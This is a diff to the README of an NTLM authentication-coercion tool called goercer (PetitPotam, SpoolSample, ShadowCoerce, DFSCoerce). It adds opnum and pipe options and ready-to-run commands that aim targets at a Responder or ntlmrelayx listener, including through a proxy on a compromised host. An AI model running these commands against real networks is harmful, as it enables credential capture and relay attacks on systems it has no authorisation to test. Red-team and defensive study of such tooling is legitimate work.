@@ -111,7 +111,7 @@ The build script will automatically fetch the required `go-smb-coercer` fork wit
 
 ## Code Structure
 
-**Single-File Design**: The entire implementation is in `goercer.go` (~2377 lines). This is an intentional design choice for:
+**Single-File Design**: The entire implementation is in `goercer.go` (~2423 lines). This is an intentional design choice for:
 - **Portability**: Easy to copy and deploy as a single file
 - **Simplicity**: No complex package structure to navigate
 - **Self-contained**: All coercion methods, auth code, and crypto in one place
@@ -122,7 +122,7 @@ The file is organized into logical sections:
 2. **Coercion Methods** (lines 400-800): PetitPotam, SpoolSample, ShadowCoerce, DFSCoerce execution
 3. **NTLM Authentication** (lines 800-1400): Full PKT_PRIVACY auth implementation
 4. **DCERPC Encoding** (lines 1400-2000): Request/response handling with encryption
-5. **NDR Stub Builders** (lines 2000-2377): Method-specific parameter encoding and utilities
+5. **NDR Stub Builders** (lines 2000-2423): Method-specific parameter encoding and utilities
 
 While this could be split into multiple files (`auth.go`, `petitpotam.go`, etc.), the single-file approach makes it easier to understand the complete attack flow and deploy to target environments.
 
@@ -174,8 +174,8 @@ All flags use the modern GNU-style format with short (`-t`) and long (`--target`
 | Flag | Long Form | Default | Description | Valid Values |
 |------|-----------|---------|-------------|--------------|
 | `-m` | `--method` | `petitpotam` | Coercion method to use | `petitpotam`, `spoolsample`, `shadowcoerce`, `dfscoerce` |
-| | `--opnum` | `-1` (all) | Test specific opnum (PetitPotam only) | `0`, `4`, `5`, `6`, `7`, `12` |
-| | `--pipe` | `efsrpc` | Named pipe (PetitPotam only) | `lsarpc`, `efsr`, `samr`, `netlogon`, `lsass` |
+| | `--opnum` | `-1` (all) | Test specific opnum only (validated) | PetitPotam: `0`, `4`, `5`, `6`, `7`, `12`<br>SpoolSample: `62`, `65` |
+| | `--pipe` | `efsrpc` | Named pipe (PetitPotam only) | `efsrpc`, `lsarpc`, `efsr`, `samr`, `netlogon`, `lsass` |
 | | `--proxy` | *(none)* | SOCKS5 proxy URL for pivoting | `socks5://127.0.0.1:1080` |
 | `-v` | `--verbose` | `false` | Enable debug output (60 DEBUG statements) | *(boolean flag, no value)* |
 | `-h` | `--help` | - | Display help message and exit | *(boolean flag, no value)* |
@@ -286,11 +286,12 @@ OPTIONS
     -l, --listener=STRING    Listener IP for callback (Responder/ntlmrelayx)
     -m, --method=STRING      Coercion method: petitpotam, spoolsample,
                              shadowcoerce, dfscoerce
-        --opnum=INT          Test specific opnum only (petitpotam): 0, 4, 5, 6,
-                             7, 12. Default: try all
+        --opnum=INT          Test specific opnum only. Default: try all.
+                             PetitPotam: 0, 4, 5, 6, 7, 12. SpoolSample: 62, 65
     -p, --password=STRING    Password (prompted if not provided)
-        --pipe=STRING        Named pipe (petitpotam only): lsarpc, efsr, samr,
-                             netlogon, lsass
+        --pipe=STRING        Named pipe (petitpotam only): efsrpc (universal - 1
+                             callback on Win11/2025, 3 on Win10/2022), lsarpc
+                             (legacy), samr, netlogon, lsass
         --proxy=STRING       SOCKS5 proxy URL (e.g., socks5://127.0.0.1:1080)
     -t, --target=STRING      Target server IP address
     -u, --user=STRING        Domain username
@@ -327,6 +328,32 @@ Use verbose mode for:
 - Debugging packet construction
 - Learning attack mechanics
 
+### Opnum Testing
+
+Test specific opnums individually to identify which ones work on your target:
+
+```bash
+# PetitPotam - test specific opnums (0, 4, 5, 6, 7, 12)
+./goercer -t <target> -l <listener> -u <user> -d <domain> -m petitpotam --pipe efsrpc --opnum 0
+./goercer -t <target> -l <listener> -u <user> -d <domain> -m petitpotam --pipe efsrpc --opnum 4
+./goercer -t <target> -l <listener> -u <user> -d <domain> -m petitpotam --pipe efsrpc --opnum 5
+
+# SpoolSample - test specific opnums (62, 65)
+./goercer -t <target> -l <listener> -u <user> -d <domain> -m spoolsample --opnum 62
+./goercer -t <target> -l <listener> -u <user> -d <domain> -m spoolsample --opnum 65
+
+# Omit --opnum to test all opnums (default behavior)
+./goercer -t <target> -l <listener> -u <user> -d <domain> -m petitpotam
+./goercer -t <target> -l <listener> -u <user> -d <domain> -m spoolsample
+```
+
+**Validation**:
+- The tool validates opnum values and rejects invalid ones
+- PetitPotam valid opnums: 0, 4, 5, 6, 7, 12
+- SpoolSample valid opnums: 62, 65
+- `--opnum` only works with `petitpotam` and `spoolsample` methods
+- ShadowCoerce and DFSCoerce do not support opnum selection
+
 ### Quick Start
 
 ```bash
@@ -353,6 +380,10 @@ sudo responder -I eth0 -v
 
 # SpoolSample - HIGH SUCCESS RATE (3 callbacks) - DISABLED BY DEFAULT ON WIN11
 ./goercer -t <target> -l <listener> -u <user> -d <domain> -m spoolsample
+
+# SpoolSample with specific opnum testing
+./goercer -t <target> -l <listener> -u <user> -d <domain> -m spoolsample --opnum 65
+./goercer -t <target> -l <listener> -u <user> -d <domain> -m spoolsample --opnum 62
 
 # Use SOCKS5 proxy (pivoting through compromised host)
 ./goercer -t <target> -l <listener> -u <user> -d <domain> -m petitpotam --proxy socks5://127.0.0.1:1080
